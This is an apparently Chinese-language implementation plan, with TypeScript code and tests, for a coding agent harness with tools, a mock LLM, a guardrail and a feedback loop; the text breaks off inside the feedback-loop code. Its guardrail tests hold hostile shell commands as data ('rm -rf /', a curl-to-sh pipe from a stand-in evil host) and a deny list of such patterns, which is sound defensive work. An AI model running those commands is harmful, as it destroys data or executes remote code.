# Coding Agent Harness Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** 构建一个 TypeScript 编码的 Coding Agent Harness，包含主循环、可注入 mock 的 LLM 抽象层、6 个工具、治理护栏、反馈闭环和记忆模块，通过 npm 分发。

**Architecture:** CLI 入口 → Agent 主循环 → LLM 抽象层 + 工具系统 + 治理护栏 + 反馈闭环 + 记忆模块。核心机制（反馈闭环、护栏）用 mock LLM 做确定性单元测试。

**Tech Stack:** TypeScript, Node.js 18+, Commander.js, OpenAI SDK, Vitest, keytar

## Global Constraints

- TypeScript 严格模式，ESM 模块系统
- 所有核心机制必须用 mock LLM 做确定性单元测试，不依赖网络和真实 LLM
- TDD：先写失败测试，再写实现，再重构
- 每个 task 完成时 commit，commit message 含中文说明
- 源码路径：`src/`，测试路径：`tests/`
- 测试命令：`npm test`（一键运行）
- 构建命令：`npm run build`
- Node.js >= 18

---

### Task 1: 项目脚手架 ✅ (commit `04e90c2`)

**Files:**
- Create: `package.json`
- Create: `tsconfig.json`
- Create: `vitest.config.ts`
- Create: `eslint.config.mjs`
- Create: `.gitignore`
- Create: `src/index.ts`
- Create: `tests/.gitkeep`

**Interfaces:**
- Consumes: nothing
- Produces: 可运行的项目骨架，`npm install` + `npm test` 通过

- [ ] **Step 1: 创建 package.json**

```json
{
  "name": "@rjj-maker/coding-agent-harness",
  "version": "0.1.0",
  "description": "A coding agent harness with feedback loop and guardrails",
  "type": "module",
  "main": "dist/index.js",
  "bin": {
    "harness": "dist/index.js"
  },
  "scripts": {
    "build": "tsc",
    "test": "vitest run",
    "test:watch": "vitest",
    "lint": "eslint src/ tests/"
  },
  "dependencies": {
    "commander": "^12.0.0",
    "openai": "^4.0.0",
    "keytar": "^7.9.0"
  },
  "devDependencies": {
    "@types/node": "^20.0.0",
    "typescript": "^5.4.0",
    "vitest": "^1.6.0",
    "eslint": "^8.57.0",
    "@typescript-eslint/eslint-plugin": "^7.0.0",
    "@typescript-eslint/parser": "^7.0.0"
  },
  "engines": {
    "node": ">=18"
  },
  "license": "MIT"
}
```

- [ ] **Step 2: 创建 tsconfig.json**

```json
{
  "compilerOptions": {
    "target": "ES2022",
    "module": "ESNext",
    "moduleResolution": "bundler",
    "outDir": "dist",
    "rootDir": "src",
    "strict": true,
    "esModuleInterop": true,
    "skipLibCheck": true,
    "forceConsistentCasingInFileNames": true,
    "declaration": true,
    "sourceMap": true
  },
  "include": ["src"],
  "exclude": ["node_modules", "dist", "tests"]
}
```

- [ ] **Step 3: 创建 vitest.config.ts**

```typescript
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    globals: true,
    environment: 'node',
  },
});
```

- [ ] **Step 4: 创建 eslint.config.mjs**

```javascript
import tseslint from '@typescript-eslint/eslint-plugin';
import tsparser from '@typescript-eslint/parser';

export default [
  {
    ignores: ['node_modules/', 'dist/', 'tests/'],
  },
  {
    files: ['src/**/*.ts'],
    languageOptions: {
      parser: tsparser,
      parserOptions: { project: './tsconfig.json' },
    },
    plugins: { '@typescript-eslint': tseslint },
    rules: {
      '@typescript-eslint/no-unused-vars': 'warn',
      '@typescript-eslint/no-explicit-any': 'warn',
    },
  },
];
```

- [ ] **Step 4b: 创建 .gitignore**

```
node_modules/
dist/
.env
*.log
```

- [ ] **Step 5: 创建 src/index.ts 占位**（注意：此 Step 的编号实际为 5，但 eslint 的添加使前序步骤编号偏移，以实际执行为准）

```typescript
#!/usr/bin/env node
console.log('Coding Agent Harness v0.1.0');
```

- [ ] **Step 7: 运行 npm install 和 npm test 验证**

Run: `npm install`
Run: `npm test`
Expected: 尚无测试文件，vitest 输出 "No test files found" 并退出码 1（此为正常行为，Task 2 添加测试后即全绿）

- [ ] **Step 8: 运行 npm run build 验证**

Run: `npm run build`
Expected: 编译成功，dist/index.js 生成

- [ ] **Step 9: Commit**

```bash
git add package.json package-lock.json tsconfig.json vitest.config.ts eslint.config.mjs .gitignore src/index.ts tests/.gitkeep
git commit -m "chore: 初始化项目脚手架" -m "创建 TypeScript + Vitest 项目骨架，配置 Commander.js、OpenAI SDK、keytar 依赖，添加构建和测试脚本。"
```

---

### Task 2: 核心类型定义 + 记忆模块

**Files:**
- Create: `src/agent/types.ts`
- Create: `src/memory/memory.ts`
- Create: `tests/memory/memory.test.ts`

**Interfaces:**
- Consumes: nothing
- Produces: `Message`, `AgentState`, `AgentConfig`, `Action`, `ToolResult`, `GuardResult`, `FeedbackResult`, `FailureDetail`, `FailureCategory` 类型；`Memory` 类（`addMessage`, `buildContext`）

- [ ] **Step 1: 写失败测试 tests/memory/memory.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { Memory } from '../../src/memory/memory.js';
import { Message } from '../../src/agent/types.js';

describe('Memory', () => {
  it('should start with empty messages', () => {
    const memory = new Memory('You are a coding assistant.');
    const ctx = memory.buildContext();
    expect(ctx).toHaveLength(1);
    expect(ctx[0].role).toBe('system');
  });

  it('should add messages and return them in context', () => {
    const memory = new Memory('You are a coding assistant.');
    memory.addMessage({ role: 'user', content: 'Hello' });
    memory.addMessage({ role: 'assistant', content: 'Hi there' });
    const ctx = memory.buildContext();
    expect(ctx).toHaveLength(3);
    expect(ctx[1].role).toBe('user');
    expect(ctx[2].role).toBe('assistant');
  });

  it('should trim context to last N messages when exceeding limit', () => {
    const memory = new Memory('System prompt', { maxMessages: 4 });
    for (let i = 0; i < 10; i++) {
      memory.addMessage({ role: 'user', content: `msg ${i}` });
    }
    const ctx = memory.buildContext();
    expect(ctx.length).toBeLessThanOrEqual(5);
    expect(ctx[0].role).toBe('system');
    expect(ctx[1].content).toBe('msg 6');
  });
});
```

- [ ] **Step 2: 运行测试验证失败**

Run: `npx vitest run tests/memory/memory.test.ts`
Expected: FAIL — Memory 类未定义

- [ ] **Step 3: 创建 src/agent/types.ts**

```typescript
export interface Message {
  role: 'system' | 'user' | 'assistant' | 'tool';
  content: string;
  toolCallId?: string;
  name?: string;
}

export type AgentState = 'idle' | 'running' | 'need_approval' | 'completed' | 'failed';

export interface AgentConfig {
  maxSteps: number;
  maxRetries: number;
  projectRoot: string;
  model: string;
}

export interface Action {
  type: string;
  params: Record<string, string>;
  id: string;
}

export interface ToolResult {
  success: boolean;
  stdout: string;
  stderr: string;
  exitCode: number;
}

export type GuardResult =
  | { allowed: true }
  | { allowed: false; reason: string; needApproval: boolean };

export interface FailureDetail {
  line: number | null;
  message: string;
  file: string | null;
}

export type FailureCategory =
  | 'syntax_error'
  | 'type_error'
  | 'assertion'
  | 'lint'
  | 'timeout'
  | 'unknown';

export interface FeedbackResult {
  passed: boolean;
  exitCode: number;
  summary: string;
  failures: FailureDetail[];
  category: FailureCategory;
}

export interface LLMOptions {
  model?: string;
  temperature?: number;
  maxTokens?: number;
}

export interface TokenUsage {
  promptTokens: number;
  completionTokens: number;
  totalTokens: number;
}

export interface LLMResponse {
  content: string;
  usage?: TokenUsage;
}

export interface LLMProvider {
  chat(messages: Message[], options?: LLMOptions): Promise<LLMResponse>;
}
```

- [ ] **Step 4: 创建 src/memory/memory.ts**

```typescript
import { Message } from '../agent/types.js';

export interface MemoryOptions {
  maxMessages?: number;
}

export class Memory {
  private messages: Message[] = [];
  private systemPrompt: string;
  private maxMessages: number;

  constructor(systemPrompt: string, options: MemoryOptions = {}) {
    this.systemPrompt = systemPrompt;
    this.maxMessages = options.maxMessages ?? 50;
  }

  // SPEC 3.7: 默认保留系统提示 + 最近 50 条消息（约 25 轮对话）

  addMessage(msg: Message): void {
    this.messages.push(msg);
  }

  buildContext(): Message[] {
    const systemMsg: Message = { role: 'system', content: this.systemPrompt };
    let recent = this.messages;
    if (recent.length > this.maxMessages) {
      recent = recent.slice(-this.maxMessages);
    }
    return [systemMsg, ...recent];
  }

  getAllMessages(): Message[] {
    return [...this.messages];
  }

  clear(): void {
    this.messages = [];
  }
}
```

- [ ] **Step 5: 运行测试验证通过**

Run: `npx vitest run tests/memory/memory.test.ts`
Expected: PASS (3 tests)

- [ ] **Step 6: Commit**

```bash
git add src/agent/types.ts src/memory/memory.ts tests/memory/memory.test.ts
git commit -m "feat: 添加核心类型和记忆模块" -m "定义 Agent 核心类型（Message, Action, AgentConfig, ToolResult, GuardResult, FeedbackResult, LLMProvider 等），实现 Memory 类（消息管理 + 上下文组装 + 截断）。TDD：先写测试后实现。"
```

---

### Task 3: LLM 抽象层（MockProvider + OpenAIProvider） ✅ (commit `ffbc386`)

**Files:**
- Create: `src/llm/provider.ts`
- Create: `src/llm/openai-provider.ts`
- Create: `src/llm/mock-provider.ts`
- Create: `tests/llm/mock-provider.test.ts`

**Interfaces:**
- Consumes: `LLMProvider`, `LLMResponse`, `Message` from Task 2 (`src/agent/types.ts`)
- Produces: `MockLLMProvider`（`queueResponse`, `getHistory`）, `OpenAIProvider`

- [ ] **Step 1: 写失败测试 tests/llm/mock-provider.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { MockLLMProvider } from '../../src/llm/mock-provider.js';

describe('MockLLMProvider', () => {
  it('should return queued responses in order', async () => {
    const mock = new MockLLMProvider();
    mock.queueResponse({ content: 'first response' });
    mock.queueResponse({ content: 'second response' });

    const r1 = await mock.chat([{ role: 'user', content: 'hello' }]);
    expect(r1.content).toBe('first response');

    const r2 = await mock.chat([{ role: 'user', content: 'world' }]);
    expect(r2.content).toBe('second response');
  });

  it('should record all messages sent to it', async () => {
    const mock = new MockLLMProvider();
    mock.queueResponse({ content: 'ok' });
    await mock.chat([{ role: 'user', content: 'test message' }]);

    const history = mock.getHistory();
    expect(history).toHaveLength(1);
    expect(history[0][0].content).toBe('test message');
  });

  it('should throw when no responses queued', async () => {
    const mock = new MockLLMProvider();
    await expect(mock.chat([{ role: 'user', content: 'hi' }]))
      .rejects.toThrow('No responses queued');
  });
});
```

- [ ] **Step 2: 运行测试验证失败**

Run: `npx vitest run tests/llm/mock-provider.test.ts`
Expected: FAIL — MockLLMProvider 类未定义

- [ ] **Step 3: 创建 src/llm/provider.ts（重新导出）**

```typescript
export { LLMProvider, LLMResponse, LLMOptions, Message } from '../agent/types.js';
```

- [ ] **Step 4: 创建 src/llm/mock-provider.ts**

```typescript
import { LLMProvider, LLMResponse, LLMOptions, Message } from '../agent/types.js';

export class MockLLMProvider implements LLMProvider {
  private responseQueue: LLMResponse[] = [];
  private messageHistory: Message[][] = [];

  queueResponse(response: LLMResponse): void {
    this.responseQueue.push(response);
  }

  async chat(messages: Message[], _options?: LLMOptions): Promise<LLMResponse> {
    this.messageHistory.push([...messages]);
    const response = this.responseQueue.shift();
    if (!response) {
      throw new Error('No responses queued in MockLLMProvider');
    }
    return response;
  }

  getHistory(): Message[][] {
    return this.messageHistory;
  }

  reset(): void {
    this.responseQueue = [];
    this.messageHistory = [];
  }
}
```

- [ ] **Step 5: 创建 src/llm/openai-provider.ts**

```typescript
import OpenAI from 'openai';
import { LLMProvider, LLMResponse, LLMOptions, Message } from '../agent/types.js';

export class OpenAIProvider implements LLMProvider {
  private client: OpenAI;
  private defaultModel: string;

  constructor(apiKey: string, baseURL: string, defaultModel: string) {
    this.client = new OpenAI({ apiKey, baseURL });
    this.defaultModel = defaultModel;
  }

  async chat(messages: Message[], options?: LLMOptions): Promise<LLMResponse> {
    const response = await this.client.chat.completions.create({
      model: options?.model ?? this.defaultModel,
      messages: messages.map((m) => ({
        role: m.role as 'system' | 'user' | 'assistant',
        content: m.content,
      })),
      temperature: options?.temperature ?? 0.7,
      max_tokens: options?.maxTokens ?? 4096,
    });

    return {
      content: response.choices[0]?.message?.content ?? '',
      usage: response.usage
        ? {
            promptTokens: response.usage.prompt_tokens,
            completionTokens: response.usage.completion_tokens,
            totalTokens: response.usage.total_tokens,
          }
        : undefined,
    };
  }
}
```

- [ ] **Step 6: 运行测试验证通过**

Run: `npx vitest run tests/llm/mock-provider.test.ts`
Expected: PASS (3 tests)

- [ ] **Step 7: Commit**

```bash
git add src/llm/provider.ts src/llm/mock-provider.ts src/llm/openai-provider.ts tests/llm/mock-provider.test.ts
git commit -m "feat: 实现 LLM 抽象层（MockLLMProvider + OpenAIProvider）" -m "MockLLMProvider 支持预设响应队列，可注入 LLM 响应进行确定性测试，记录所有消息历史以便验证。OpenAIProvider 封装 OpenAI SDK 兼容 NJUSE Hub。TDD：先写测试后实现。"
```

---

### Task 4: 工具系统（接口 + 注册表 + 6 个工具） ✅ (commit `19f5469`)

**Files:**
- Create: `src/tools/tool.ts`
- Create: `src/tools/registry.ts`
- Create: `src/tools/read-file.ts`
- Create: `src/tools/write-file.ts`
- Create: `src/tools/shell.ts`
- Create: `src/tools/run-test.ts`
- Create: `src/tools/lint.ts`
- Create: `src/tools/grep.ts`
- Create: `tests/tools/registry.test.ts`
- Create: `tests/tools/shell.test.ts`

**Interfaces:**
- Consumes: `ToolResult`, `Action` from Task 2 (`src/agent/types.ts`)
- Produces: `Tool` 接口, `ToolRegistry`, `ReadFileTool`, `WriteFileTool`, `ShellTool`, `RunTestTool`, `LintTool`, `GrepTool`

- [ ] **Step 1: 写失败测试 tests/tools/registry.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { ToolRegistry } from '../../src/tools/registry.js';
import { Tool } from '../../src/tools/tool.js';
import { ToolResult } from '../../src/agent/types.js';

class FakeTool implements Tool {
  name = 'fake';
  description = 'A fake tool';
  parameters = { input: { type: 'string', description: 'test param' } };
  async execute(_params: Record<string, string>): Promise<ToolResult> {
    return { success: true, stdout: 'fake output', stderr: '', exitCode: 0 };
  }
}

describe('ToolRegistry', () => {
  it('should register and execute a tool', async () => {
    const registry = new ToolRegistry();
    const tool = new FakeTool();
    registry.register(tool);

    const result = await registry.execute({
      type: 'fake',
      params: { input: 'hello' },
      id: '1',
    });

    expect(result.success).toBe(true);
    expect(result.stdout).toBe('fake output');
  });

  it('should throw for unknown tool', async () => {
    const registry = new ToolRegistry();
    await expect(
      registry.execute({ type: 'unknown', params: {}, id: '1' })
    ).rejects.toThrow('Unknown tool: unknown');
  });

  it('should return tool descriptions for LLM context', () => {
    const registry = new ToolRegistry();
    registry.register(new FakeTool());
    const descs = registry.getToolDescriptions();
    expect(descs).toContain('fake');
    expect(descs).toContain('A fake tool');
  });
});
```

- [ ] **Step 2: 运行测试验证失败**

Run: `npx vitest run tests/tools/registry.test.ts`
Expected: FAIL

- [ ] **Step 3: 创建 src/tools/tool.ts**

```typescript
import { ToolResult } from '../agent/types.js';

export interface Tool {
  name: string;
  description: string;
  parameters: Record<string, { type: string; description: string }>;
  execute(params: Record<string, string>): Promise<ToolResult>;
}
```

- [ ] **Step 4: 创建 src/tools/registry.ts**

```typescript
import { Action, ToolResult } from '../agent/types.js';
import { Tool } from './tool.js';

export class ToolRegistry {
  private tools: Map<string, Tool> = new Map();

  register(tool: Tool): void {
    this.tools.set(tool.name, tool);
  }

  async execute(action: Action): Promise<ToolResult> {
    const tool = this.tools.get(action.type);
    if (!tool) {
      throw new Error(`Unknown tool: ${action.type}`);
    }
    return tool.execute(action.params);
  }

  getToolDescriptions(): string {
    const descriptions: string[] = [];
    for (const tool of this.tools.values()) {
      descriptions.push(`- ${tool.name}: ${tool.description}`);
    }
    return descriptions.join('\n');
  }

  getToolNames(): string[] {
    return Array.from(this.tools.keys());
  }
}
```

- [ ] **Step 5: 创建 6 个工具实现**

创建 `src/tools/read-file.ts`:
```typescript
import { readFile } from 'fs/promises';
import { resolve } from 'path';
import { Tool } from './tool.js';
import { ToolResult } from '../agent/types.js';

export class ReadFileTool implements Tool {
  name = 'read_file';
  description = 'Read the contents of a file';
  parameters = { path: { type: 'string', description: 'File path relative to project root' } };
  private projectRoot: string;

  constructor(projectRoot: string) {
    this.projectRoot = projectRoot;
  }

  async execute(params: Record<string, string>): Promise<ToolResult> {
    try {
      const fullPath = resolve(this.projectRoot, params.path);
      if (!fullPath.startsWith(resolve(this.projectRoot))) {
        return { success: false, stdout: '', stderr: 'Access denied: path outside project root', exitCode: 1 };
      }
      const content = await readFile(fullPath, 'utf-8');
      return { success: true, stdout: content, stderr: '', exitCode: 0 };
    } catch (e) {
      return { success: false, stdout: '', stderr: String(e), exitCode: 1 };
    }
  }
}
```

创建 `src/tools/write-file.ts`:
```typescript
import { writeFile } from 'fs/promises';
import { mkdir } from 'fs/promises';
import { dirname, resolve } from 'path';
import { Tool } from './tool.js';
import { ToolResult } from '../agent/types.js';

export class WriteFileTool implements Tool {
  name = 'write_file';
  description = 'Write content to a file (creates parent directories if needed)';
  parameters = {
    path: { type: 'string', description: 'File path relative to project root' },
    content: { type: 'string', description: 'Content to write' },
  };
  private projectRoot: string;

  constructor(projectRoot: string) {
    this.projectRoot = projectRoot;
  }

  async execute(params: Record<string, string>): Promise<ToolResult> {
    try {
      const fullPath = resolve(this.projectRoot, params.path);
      if (!fullPath.startsWith(resolve(this.projectRoot))) {
        return { success: false, stdout: '', stderr: 'Access denied: path outside project root', exitCode: 1 };
      }
      await mkdir(dirname(fullPath), { recursive: true });
      await writeFile(fullPath, params.content, 'utf-8');
      return { success: true, stdout: `File written: ${params.path}`, stderr: '', exitCode: 0 };
    } catch (e) {
      return { success: false, stdout: '', stderr: String(e), exitCode: 1 };
    }
  }
}
```

创建 `src/tools/shell.ts`:
```typescript
import { exec } from 'child_process';
import { Tool } from './tool.js';
import { ToolResult } from '../agent/types.js';

export class ShellTool implements Tool {
  name = 'shell';
  description = 'Execute a shell command';
  parameters = { command: { type: 'string', description: 'Shell command to execute' } };

  async execute(params: Record<string, string>): Promise<ToolResult> {
    return new Promise((resolve) => {
      const child = exec(params.command, { timeout: 60000, maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        resolve({
          success: !error,
          stdout: stdout.slice(0, 10000),
          stderr: stderr.slice(0, 10000),
          exitCode: error ? (error as any).code ?? 1 : 0,
        });
      });
    });
  }
}
```

创建 `src/tools/run-test.ts`:
```typescript
import { Tool } from './tool.js';
import { ToolResult } from '../agent/types.js';
import { ShellTool } from './shell.js';

export class RunTestTool implements Tool {
  name = 'run_test';
  description = 'Run test command (e.g., npm test, vitest)';
  parameters = { command: { type: 'string', description: 'Test command to run' } };
  private shell: ShellTool;

  constructor() {
    this.shell = new ShellTool();
  }

  async execute(params: Record<string, string>): Promise<ToolResult> {
    return this.shell.execute(params);
  }
}
```

创建 `src/tools/lint.ts`:
```typescript
import { Tool } from './tool.js';
import { ToolResult } from '../agent/types.js';
import { ShellTool } from './shell.js';

export class LintTool implements Tool {
  name = 'lint';
  description = 'Run linter on specified path';
  parameters = { path: { type: 'string', description: 'Path to lint' } };
  private shell: ShellTool;

  constructor() {
    this.shell = new ShellTool();
  }

  async execute(params: Record<string, string>): Promise<ToolResult> {
    return this.shell.execute({ command: `npx eslint ${params.path}` });
  }
}
```

创建 `src/tools/grep.ts`:
```typescript
import { readFile } from 'fs/promises';
import { resolve } from 'path';
import { glob } from 'fs/promises';
import { Tool } from './tool.js';
import { ToolResult } from '../agent/types.js';

export class GrepTool implements Tool {
  name = 'grep';
  description = 'Search for a pattern in project files';
  parameters = {
    pattern: { type: 'string', description: 'Regex pattern to search for' },
    path: { type: 'string', description: 'Directory or file to search in' },
  };
  private projectRoot: string;

  constructor(projectRoot: string) {
    this.projectRoot = projectRoot;
  }

  async execute(params: Record<string, string>): Promise<ToolResult> {
    try {
      const searchPath = resolve(this.projectRoot, params.path);
      if (!searchPath.startsWith(resolve(this.projectRoot))) {
        return { success: false, stdout: '', stderr: 'Access denied: path outside project root', exitCode: 1 };
      }

      const regex = new RegExp(params.pattern, 'g');
      const results: string[] = [];
      const entries = await glob('**/*.{ts,js,json,md}', { cwd: searchPath, nodir: true });

      for (const entry of entries.slice(0, 50)) {
        const fullPath = resolve(searchPath, entry);
        const content = await readFile(fullPath, 'utf-8');
        const lines = content.split('\n');
        for (let i = 0; i < lines.length; i++) {
          if (regex.test(lines[i])) {
            results.push(`${entry}:${i + 1}: ${lines[i].trim()}`);
          }
          regex.lastIndex = 0;
        }
      }

      return {
        success: true,
        stdout: results.join('\n') || 'No matches found',
        stderr: '',
        exitCode: 0,
      };
    } catch (e) {
      return { success: false, stdout: '', stderr: String(e), exitCode: 1 };
    }
  }
}
```

- [ ] **Step 6: 写 tests/tools/shell.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { ShellTool } from '../../src/tools/shell.js';

describe('ShellTool', () => {
  it('should execute echo command', async () => {
    const tool = new ShellTool();
    const result = await tool.execute({ command: 'echo hello' });
    expect(result.success).toBe(true);
    expect(result.stdout).toContain('hello');
    expect(result.exitCode).toBe(0);
  });

  it('should return failure for non-existent command', async () => {
    const tool = new ShellTool();
    const result = await tool.execute({ command: 'nonexistent_command_12345' });
    expect(result.success).toBe(false);
    expect(result.exitCode).not.toBe(0);
  });
});
```

- [ ] **Step 7: 运行测试验证通过**

Run: `npx vitest run tests/tools/registry.test.ts tests/tools/shell.test.ts`
Expected: PASS (5 tests)

- [ ] **Step 8: Commit**

```bash
git add src/tools/ tests/tools/
git commit -m "feat: 实现工具系统（接口 + 注册表 + 6 个工具）" -m "Tool 接口 + ToolRegistry 工具注册与分发。实现 6 个工具：ReadFileTool、WriteFileTool、ShellTool、RunTestTool、LintTool、GrepTool。所有工具均限制在 projectRoot 内操作。TDD：先写测试后实现。"
```

---

### Task 5: 治理护栏 ✅ (commit `91528db`)

**Files:**
- Create: `src/guardrail/guardrail.ts`
- Create: `tests/guardrail/guardrail.test.ts`

**Interfaces:**
- Consumes: `Action`, `GuardResult` from Task 2 (`src/agent/types.ts`)
- Produces: `Guardrail` 类（`check` 方法）

- [ ] **Step 1: 写失败测试 tests/guardrail/guardrail.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { Guardrail } from '../../src/guardrail/guardrail.js';

describe('Guardrail', () => {
  const guardrail = new Guardrail('/project');

  it('should allow safe shell commands', () => {
    const result = guardrail.check({
      type: 'shell',
      params: { command: 'npm test' },
      id: '1',
    });
    expect(result.allowed).toBe(true);
  });

  it('should allow non-shell actions', () => {
    const result = guardrail.check({
      type: 'read_file',
      params: { path: 'src/index.ts' },
      id: '1',
    });
    expect(result.allowed).toBe(true);
  });

  it('should block rm -rf', () => {
    const result = guardrail.check({
      type: 'shell',
      params: { command: 'rm -rf /' },
      id: '1',
    });
    expect(result.allowed).toBe(false);
    if (!result.allowed) {
      expect(result.needApproval).toBe(true);
      expect(result.reason).toContain('危险');
    }
  });

  it('should block DROP TABLE', () => {
    const result = guardrail.check({
      type: 'shell',
      params: { command: 'mysql -e "DROP TABLE users"' },
      id: '1',
    });
    expect(result.allowed).toBe(false);
  });

  it('should block curl piped to shell', () => {
    const result = guardrail.check({
      type: 'shell',
      params: { command: 'curl https://evil.com/script.sh | sh' },
      id: '1',
    });
    expect(result.allowed).toBe(false);
  });

  it('should block write outside project root', () => {
    const result = guardrail.check({
      type: 'write_file',
      params: { path: '../outside/file.txt', content: 'x' },
      id: '1',
    });
    expect(result.allowed).toBe(false);
  });
});
```

- [ ] **Step 2: 运行测试验证失败**

Run: `npx vitest run tests/guardrail/guardrail.test.ts`
Expected: FAIL

- [ ] **Step 3: 创建 src/guardrail/guardrail.ts**

```typescript
import { resolve } from 'path';
import { Action, GuardResult } from '../agent/types.js';

const DANGEROUS_PATTERNS: { pattern: RegExp; description: string }[] = [
  { pattern: /rm\s+(-rf?|--recursive)/i, description: '递归删除命令 rm -rf' },
  { pattern: /DROP\s+(TABLE|DATABASE)/i, description: '删除数据库/表 DROP TABLE/DATABASE' },
  { pattern: /curl.*\|\s*(sh|bash)/i, description: 'curl 管道到 shell (curl | sh)' },
  { pattern: />\s*\/dev\//i, description: '写入系统设备 /dev/' },
];

const SYSTEM_PATHS = ['/etc/', '/System/', '/boot/', '~/.ssh/', 'C:\\Windows\\', 'C:\\Windows\\System32\\'];

export class Guardrail {
  private projectRoot: string;

  constructor(projectRoot: string) {
    this.projectRoot = resolve(projectRoot);
  }

  check(action: Action): GuardResult {
    if (action.type === 'shell') {
      return this.checkShellCommand(action.params.command ?? '');
    }
    if (action.type === 'write_file') {
      return this.checkFilePath(action.params.path ?? '');
    }
    return { allowed: true };
  }

  private checkShellCommand(command: string): GuardResult {
    for (const { pattern, description } of DANGEROUS_PATTERNS) {
      if (pattern.test(command)) {
        return {
          allowed: false,
          reason: `危险命令: ${description} (${command})`,
          needApproval: true,
        };
      }
    }
    return { allowed: true };
  }

  private checkFilePath(filePath: string): GuardResult {
    const resolved = resolve(this.projectRoot, filePath);
    if (!resolved.startsWith(this.projectRoot)) {
      return {
        allowed: false,
        reason: `操作超出项目目录: ${filePath}`,
        needApproval: true,
      };
    }
    for (const sysPath of SYSTEM_PATHS) {
      if (resolved.startsWith(sysPath)) {
        return {
          allowed: false,
          reason: `禁止写入系统路径: ${filePath}`,
          needApproval: true,
        };
      }
    }
    return { allowed: true };
  }
}
```

- [ ] **Step 4: 运行测试验证通过**

Run: `npx vitest run tests/guardrail/guardrail.test.ts`
Expected: PASS (6 tests)

- [ ] **Step 5: Commit**

```bash
git add src/guardrail/guardrail.ts tests/guardrail/guardrail.test.ts
git commit -m "feat: 实现治理护栏模块" -m "Guardrail 类支持危险命令黑名单（rm -rf、DROP TABLE、curl | sh 等）和路径越界检查，危险动作返回 needApproval 以触发 HITL。所有检测逻辑均为确定性代码，不依赖 LLM。TDD：先写测试后实现。"
```

---

### Task 6: 反馈闭环（主维度） ✅ (commit `facca10`)

**Files:**
- Create: `src/feedback/feedback-loop.ts`
- Create: `tests/feedback/feedback-loop.test.ts`

**Interfaces:**
- Consumes: `ToolResult`, `FeedbackResult`, `FailureDetail`, `FailureCategory` from Task 2
- Produces: `FeedbackLoop` 类（`process`, `generateFeedback`, `classify`）

- [ ] **Step 1: 写失败测试 tests/feedback/feedback-loop.test.ts**

```typescript
import { describe, it, expect } from 'vitest';
import { FeedbackLoop } from '../../src/feedback/feedback-loop.js';

describe('FeedbackLoop', () => {
  const feedback = new FeedbackLoop();

  it('should detect passing test', () => {
    const result = feedback.process({
      success: true,
      stdout: 'Tests: 5 passed',
      stderr: '',
      exitCode: 0,
    });
    expect(result.passed).toBe(true);
    expect(result.category).toBe('unknown');
    expect(result.failures).toHaveLength(0);
  });

  it('should detect syntax error', () => {
    const result = feedback.process({
      success: false,
      stdout: '',
      stderr: 'SyntaxError: Unexpected token at line 42',
      exitCode: 1,
    });
    expect(result.passed).toBe(false);
    expect(result.category).toBe('syntax_error');
    expect(result.failures.length).toBeGreaterThan(0);
  });

  it('should detect type error', () => {
    const result = feedback.process({
      success: false,
      stdout: '',
      stderr: "error TS2322: Type 'string' is not assignable to type 'number'",
      exitCode: 2,
    });
    expect(result.passed).toBe(false);
    expect(result.category).toBe('type_error');
  });

  it('should detect assertion failure', () => {
    const result = feedback.process({
      success: false,
      stdout: '',
      stderr: 'AssertionError: expected 1 to equal 2',
      exitCode: 1,
    });
    expect(result.passed).toBe(false);
    expect(result.category).toBe('assertion');
  });

  it('should detect lint failure', () => {
    const result = feedback.process({
      success: false,
      stdout: '3 problems (2 errors, 1 warning)',
      stderr: '',
      exitCode: 1,
    });
    expect(result.passed).toBe(false);
    expect(result.category).toBe('lint');
  });

  it('should detect timeout', () => {
    const result = feedback.process({
      success: false,
      stdout: '',
      stderr: 'ETIMEDOUT',
      exitCode: 124,
    });
    expect(result.passed).toBe(false);
    expect(result.category).toBe('timeout');
  });

  it('should generate feedback text for LLM', () => {
    const result = feedback.process({
      success: false,
      stdout: 'Tests: 1 failed',
      stderr: 'AssertionError: expected 1 to equal 2\n    at Object.<anonymous> (test.ts:10:5)',
      exitCode: 1,
    });
    const text = feedback.generateFeedback(result);
    expect(text).toContain('FAILED');
    expect(text).toContain('assertion');
    expect(text).toContain('AssertionError');
  });

  it('should generate passing feedback text', () => {
    const result = feedback.process({
      success: true,
      stdout: 'Tests: 5 passed',
      stderr: '',
      exitCode: 0,
    });
    const text = feedback.generateFeedback(result);
    expect(text).toContain('PASSED');
  });
});
```

- [ ] **Step 2: 运行测试验证失败**

Run: `npx vitest run tests/feedback/feedback-loop.test.ts`
Expected: FAIL

- [ ] **Step 3: 创建 src/feedback/feedback-loop.ts**

```typescript
import { FeedbackResult, FailureDetail, ToolResult } from '../agent/types.js';

const MAX_OUTPUT_LENGTH = 2000;

export class FeedbackLoop {
  process(result: ToolResult): FeedbackResult {
    const passed = result.exitCode === 0;
    const category = this.classify(result.stderr + result.stdout);
    const failures = this.extractFailures(result.stderr + result.stdout, category);
    const summary = this.generateSummary(passed, category, failures, result);

    return {
      passed,
      exitCode: result.exitCode,
      category,
      failures,
      summary,
    };
  }

  classify(output: string): FeedbackResult['category'] {
    if (/ETIMEDOUT|timed?\s*out/i.test(output)) return 'timeout';
    if (/SyntaxError|Unexpected\s+token/i.test(output)) return 'syntax_error';
    if (/Type\s+'[^']+'\s+is\s+not\s+assignable|TS\d{4}/i.test(output)) return 'type_error';
    if (/AssertionError|expected.*(to|==|===)|received/i.test(output)) return 'assertion';
    if (/problems?|warnings?|errors?/i.test(output) && /eslint|prettier|tslint/i.test(output))
      return 'lint';
    if (!/(?:SyntaxError|AssertionError|problems?)/i.test(output) && this.looksLikeTestOutput(output))
      return 'lint';
    return 'unknown';
  }

  private looksLikeTestOutput(output: string): boolean {
    return /\d+\s+(problems?|errors?|warnings?)/i.test(output);
  }

  extractFailures(output: string, _category: FeedbackResult['category']): FailureDetail[] {
    const failures: FailureDetail[] = [];
    const lines = output.split('\n');
    for (const line of lines) {
      const trimmed = line.trim();
      if (!trimmed) continue;
